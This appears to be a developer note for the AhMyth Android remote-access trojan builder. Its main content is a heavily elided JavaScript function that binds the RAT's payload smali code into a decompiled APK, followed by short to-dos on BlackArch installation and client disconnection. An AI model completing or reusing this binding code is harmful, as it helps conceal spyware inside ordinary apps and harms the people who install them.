## Updated `CopyAhmythFilesAndGenerateApk` function
> Fixes a major binding bug
> > Needs appropriate function wrapping
```js
$appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
    ...
    fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
        ...
        var ignoreDirs = ['original', 'res', 'build', 'kotlin', 'lib', 'assets', 'META-INF', 'unknown', 'smali_assets'];
            ...
            fs.mkdir(apkFolder + "/smali_classes2", { recursive: true }, error => {
                ...
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                    dir.join(apkFolder, "smali_classes2"), (error) => {
                        ...
                        fs.copy(dir.join(apkFolder, 'smali_classes2', 'android'),
                            dir.join(apkFolder, 'smali', 'android'), { overwrite: true }, (error) => {
                                if (error) {
                                ...
                                fs.copy(dir.join(apkFolder, 'smali_classes2', 'androidx'),
                                    dir.join(apkFolder, 'smali', 'androidx'), { overwrite: true }, (error) => {
                                        if (error) {
                                        ...
                                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'android'), { recursive: true });
                                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'androidx'), { recursive: true });
            ...
            fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
                ...
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                    dir.join(apkFolder, payloadSmaliFolder), (error) => {
                        ...
                        // Copy android directory to the smali folder in the new Smali Payload Directory
                        fs.copy(dir.join(apkFolder, payloadSmaliFolder, 'android'),
                            dir.join(apkFolder, 'smali', 'android'), { overwrite: true }, (error) => {
                                if (error) {
                                    delayedLog('[x] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                                    WriteErrorLog(error, 'Copying "android" directory');
                                ...
                                // Copy androidx directory to the smali folder in the new Smali Payload Directory
                                fs.copy(dir.join(apkFolder, payloadSmaliFolder, 'androidx'),
                                    dir.join(apkFolder, 'smali', 'androidx'), { overwrite: true }, (error) => {
                                        if (error) {
                                            delayedLog('[x] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                                            WriteErrorLog(error, 'Copying "androidx" directory');
                                        ...
                                        // Remove the original 'android' and 'androidx' directories
                                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'android'), { recursive: true });
                                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'androidx'), { recursive: true });
...
>> Needs to be updated to install for *Blackarch* Pentesting Distro.
```bash
#!/bin/sh
...
> Needs to be updated to disconnect from specifc clients on specific ports
>> Currently works to disconnect the server from every active client.
- Index.html
```html
